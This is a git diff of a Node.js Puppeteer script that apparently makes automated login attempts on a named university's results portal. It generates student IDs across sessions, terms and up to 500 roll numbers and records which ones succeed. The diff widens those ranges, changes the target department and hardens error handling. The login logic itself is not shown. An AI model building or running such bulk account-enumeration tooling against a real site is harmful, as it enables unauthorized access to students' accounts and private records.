@@ -1,9 +1,9 @@
-import puppeteer from "puppeteer";
+const puppeteer = require("puppeteer");
 
 const baseUrl = "https://nubtkhulna.ac.bd/ter";
-const department = "ARCH";
+const department = "CSE"; // Change this to your department code
 const rollStart = 1;
-const rollEnd = 200;
+const rollEnd = 500;
 
 (async () => {
     const browser = await puppeteer.launch({ headless: true });
@@ -11,11 +11,11 @@ const rollEnd = 200;
 
     let lastSuccessRoll = rollStart;
 
-    for (let year = 17; year <= 25; year++) {
+    for (let year = 16; year <= 25; year++) {
         for (const term of ["01", "03"]) {
             const session = `${year}${term}`;
             let failureCount = 0;
-            
+
             let skipSession = false;
 
             console.log(`\n🚀 Starting session: ${session}\n`);
@@ -26,7 +26,7 @@ const rollEnd = 200;
 
                 console.log(`🔍 Trying: ${userId}`);
                 const page = await browser.newPage();
-                page.setDefaultNavigationTimeout(20000);
+                await page.setDefaultNavigationTimeout(20000);
 
                 try {
                     await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
@@ -96,7 +96,11 @@ const rollEnd = 200;
                         break;
                     }
                 } finally {
-                    await page.close();
+                    try {
+                        await page.close();
+                    } catch (closeErr) {
+                        console.warn(`⚠️ Page close failed: ${closeErr.message}`);
+                    }
                 }
 
                 if (skipSession) break;
